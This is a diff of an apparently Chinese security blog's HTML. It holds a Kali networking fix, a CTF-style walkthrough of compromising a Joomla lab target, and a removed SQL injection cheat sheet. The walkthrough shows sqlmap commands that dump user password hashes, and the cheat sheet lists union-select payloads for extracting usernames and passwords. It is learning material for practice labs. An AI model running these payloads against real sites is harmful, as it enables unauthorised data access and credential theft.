@@ -155,6 +155,81 @@
     
     
     <article
+  id="post-kali网络连接失败"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2021/11/23/kali%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5/"
+    >kali网络连接失败</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/11/23/kali%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5/" class="article-date">
+  <time datetime="2021-11-23T13:38:24.000Z" itemprop="datePublished">2021-11-23</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/kali%E6%B8%97%E9%80%8F/">kali渗透</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>先<strong>ifconfig</strong>查看网卡，看网卡是否存在</p>
+<p>启动网卡</p>
+<blockquote>
+<p>ifconfig eth0 up</p>
+</blockquote>
+<p>再查看eth0网卡</p>
+<blockquote>
+<p>ifconfig -a</p>
+</blockquote>
+<p>进行网络设置</p>
+<blockquote>
+<p>vi /etc/network/interfaces</p>
+</blockquote>
+<p>添加</p>
+<blockquote>
+<p>auto eth0</p>
+<p>iface eth0 inet dhcp</p>
+</blockquote>
+<p>重启网络</p>
+<blockquote>
+<p>/etc/init.d/networking restart</p>
+</blockquote>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali/" rel="tag">kali</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
   id="post-xshell连接到kali"
   class="article article-type-post"
   itemscope
@@ -190,7 +265,7 @@
 <p> vi /etc/ssh/sshd_config</p>
 </blockquote>
 <p>将PermitRootLogin后面的without-password修改为：yes</p>
-<p>找到#PubkeyAuthentication yes 把#的注释去掉<br><img src="https://img-blog.csdnimg.cn/bede0b9736de464e91705d0ff00511a5.png" alt="在这里插入图片描述"></p>
+<p>找到#PubkeyAuthentication yes 把#的注释去掉<br><img src="https://img-blog.csdnimg.cn/bede0b9736de464e91705d0ff00511a5.png"></p>
 <p>启动ssh服务</p>
 <blockquote>
 <p>/etc/init.d/ssh start</p>
@@ -319,24 +394,24 @@
     <div class="article-entry" itemprop="articleBody">
        
   <p>老规矩，先arp扫存活主机</p>
-<p><img src="https://img-blog.csdnimg.cn/920797be2d274feca55d280cdcd21e02.png" alt="在这里插入图片描述"><br>发现80端口开放，进行访问</p>
-<p><img src="https://img-blog.csdnimg.cn/a39fed502e944abb8e283e1358b12d9e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7396a3db08904135b8fd00580dfe50e4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得知这次只有一个flag，我们只需要拿到root权限就能拿到flag<br>由于没有任何提示，我们先尝试用dirsearch扫描目录，发现readme.txt</p>
-<p><img src="https://img-blog.csdnimg.cn/0b1182928f234f10969229eaa29fffd0.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/920797be2d274feca55d280cdcd21e02.png"><br>发现80端口开放，进行访问</p>
+<p><img src="https://img-blog.csdnimg.cn/a39fed502e944abb8e283e1358b12d9e.png"><br><img src="https://img-blog.csdnimg.cn/7396a3db08904135b8fd00580dfe50e4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>得知这次只有一个flag，我们只需要拿到root权限就能拿到flag<br>由于没有任何提示，我们先尝试用dirsearch扫描目录，发现readme.txt</p>
+<p><img src="https://img-blog.csdnimg.cn/0b1182928f234f10969229eaa29fffd0.png"></p>
 <p>访问readme.txt，可以知道该网站cms为joomla</p>
-<p><img src="https://img-blog.csdnimg.cn/9b9a98bb8c824ee8ae66c7ba3b1d2a98.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/9b9a98bb8c824ee8ae66c7ba3b1d2a98.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
 <p>尝试用msf攻击</p>
-<p><img src="https://img-blog.csdnimg.cn/13026bbd593b4111be859451f2c4584c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>试了几个漏洞都没啥用，这时候看wp才知道要用searchspliot</p>
+<p><img src="https://img-blog.csdnimg.cn/13026bbd593b4111be859451f2c4584c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>试了几个漏洞都没啥用，这时候看wp才知道要用searchspliot</p>
 <blockquote>
 <p>“searchsploit”是一个用于Exploit-DB的命令行搜索工具，可以帮助我们查找渗透模块。<br>Exploit-DB是一个漏洞库，Kali Linux中保存了一个该漏洞库的拷贝，利用上面提到的命令就可以查找需要的渗透模块，它将搜索所有的漏洞和shellcode而且该漏洞库是保存在本地的，在没有网络的情况下也可以使用。<br>基本搜索方法就是searchsploit+可能包含漏洞的软件/系统等等，对应回显存在的漏洞和用于渗透的脚本。</p>
 </blockquote>
 <p>先查看Joomla版本</p>
-<p><img src="https://img-blog.csdnimg.cn/5ae4124c7c084c8d8f4e6742c4dc9413.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>用searchspliot查询joomla该版本漏洞，发现sql注入漏洞</p>
-<p><img src="https://img-blog.csdnimg.cn/4b17531b808c4caf88250c004b163745.png" alt="在这里插入图片描述"><br>接下来就是用sqlmap跑库跑表</p>
+<p><img src="https://img-blog.csdnimg.cn/5ae4124c7c084c8d8f4e6742c4dc9413.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>用searchspliot查询joomla该版本漏洞，发现sql注入漏洞</p>
+<p><img src="https://img-blog.csdnimg.cn/4b17531b808c4caf88250c004b163745.png"><br>接下来就是用sqlmap跑库跑表</p>
 <p>sqlmap -u “url” –dbms mysql –dbs<br><img src="https://img-blog.csdnimg.cn/ebb06045ded24322ba62b63228ea4463.png" alt="在这里插入图片描述"><br>sqlmap -u “url” –dbms mysql -D joomladb –tables<br><img src="https://img-blog.csdnimg.cn/a1c0d10beef24cef98884d23f8e8bde3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>sqlmap -u “url” –dbms mysql -D joolmladb -T ‘#__users’ –columns </p>
-<p><img src="https://img-blog.csdnimg.cn/d97afa99859246c0a03cc1cee1a1b12c.png" alt="在这里插入图片描述"><br>sqlmap -u “url” –dbms mysql -D joomladb -T ‘#__users’ -C name,password –dump</p>
-<p>得到hash加密过的密码<br><img src="https://img-blog.csdnimg.cn/d0daaad8b0284f7c87f80af75ed3bba3.png" alt="在这里插入图片描述"><br>接下来用John破解密码<br>john the ripper是一款本地密码破解工具，可以从我们上面生成的shadow文件（密码散列）中破解出密码。破解时间取决于密码的复杂程度以及破解模式。</p>
+<p><img src="https://img-blog.csdnimg.cn/d97afa99859246c0a03cc1cee1a1b12c.png"><br>sqlmap -u “url” –dbms mysql -D joomladb -T ‘#__users’ -C name,password –dump</p>
+<p>得到hash加密过的密码<br><img src="https://img-blog.csdnimg.cn/d0daaad8b0284f7c87f80af75ed3bba3.png"><br>接下来用John破解密码<br>john the ripper是一款本地密码破解工具，可以从我们上面生成的shadow文件（密码散列）中破解出密码。破解时间取决于密码的复杂程度以及破解模式。</p>
 <p>破解得到admin的密码为snoopy<br>登录网站发现啥也没有，猜测网站应该有后台，重新用dirsearch扫描得到/administrator,访问登录成功</p>
-<p><img src="https://img-blog.csdnimg.cn/2a19c2e354a64b3bada973c8b1f401f5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在extensions中找到大量php文件，尝试创建一个新的php文件进行访问</p>
+<p><img src="https://img-blog.csdnimg.cn/2a19c2e354a64b3bada973c8b1f401f5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYmFpeWV4aW5nOA==,size_20,color_FFFFFF,t_70,g_se,x_16"><br>在extensions中找到大量php文件，尝试创建一个新的php文件进行访问</p>
  
       <!-- reward -->
       
@@ -840,83 +915,6 @@
 <h5 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h5><blockquote>
 <p>Length（）函数 返回字符串的长度<br>Substr（）截取字符串<br>Ascii（）返回字符的ascii码<br>sleep(n)：将程序挂起一段时间 n为n秒<br>if(expr1,expr2,expr3):判断语句如果第一个语句正确就执行第二个语句，如果错误执行第三个语句</p>
 </blockquote>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-sql注入1"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2021/09/10/sql%E6%B3%A8%E5%85%A51/"
-    >sql注入1</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2021/09/10/sql%E6%B3%A8%E5%85%A51/" class="article-date">
-  <time datetime="2021-09-10T10:10:59.000Z" itemprop="datePublished">2021-09-10</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h3 id="sql注入流程"><a href="#sql注入流程" class="headerlink" title="sql注入流程"></a>sql注入流程</h3><h4 id="在参数后面加-’-判断是否存在注入点"><a href="#在参数后面加-’-判断是否存在注入点" class="headerlink" title="在参数后面加 ’ 判断是否存在注入点"></a>在参数后面加 ’ 判断是否存在注入点</h4><h4 id="判断是字符型还是数字型"><a href="#判断是字符型还是数字型" class="headerlink" title="判断是字符型还是数字型"></a>判断是字符型还是数字型</h4><h5 id="判断数字型"><a href="#判断数字型" class="headerlink" title="判断数字型"></a>判断数字型</h5><p>1 and 1=1  返回正常</p>
-<p>1 and 1=2  报错</p>
-<h5 id="判断字符型"><a href="#判断字符型" class="headerlink" title="判断字符型"></a>判断字符型</h5><p>1’ and 1=1#  返回正常</p>
-<p>1’ and 1=2#  报错</p>
-<p>也可以用1 order by 999#判断，如果有回显则为字符型，反之为数字型</p>
-<h4 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h4><p>单引号 ‘</p>
-<p>双引号 “</p>
-<p>单引号加括号 ‘）</p>
-<p>双引号加括号 ”）</p>
-<h4 id="判断列"><a href="#判断列" class="headerlink" title="判断列"></a>判断列</h4><p>order by 4 –+</p>
-<h4 id="判断回显位置"><a href="#判断回显位置" class="headerlink" title="判断回显位置"></a>判断回显位置</h4><p>union select 1,2,3 –+ </p>
-<h4 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h4><p>union select 1,version(),database() –+</p>
-<h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><p>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ –+</p>
-<h4 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h4><p>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+</p>
-<h4 id="爆用户名密码"><a href="#爆用户名密码" class="headerlink" title="爆用户名密码"></a>爆用户名密码</h4><p> union select 1,2,group_concat(username,0x3a,password) from users –+    </p>
-<p>注：联合注入前面的语句要为假</p>
-<h4 id="注释符失效"><a href="#注释符失效" class="headerlink" title="注释符失效"></a>注释符失效</h4><p>使用#号失效</p>
-<p>​    有时发现执行的sql语句中没有#号</p>
-<p>​    原因是url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。</p>
-<p>​    所以，HTTP请求中不包括#</p>
-<p>​    将#号改成url的编码%23就可以了</p>
-<p>使用–失效</p>
-<p>​    使用– （有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用–+的方式来闭合，因为+会被解释成空格。</p>
-<p>​    在注入时我们除了使用–+外，也可以使用–’来完成sql注入语句</p>
  
       <!-- reward -->
       
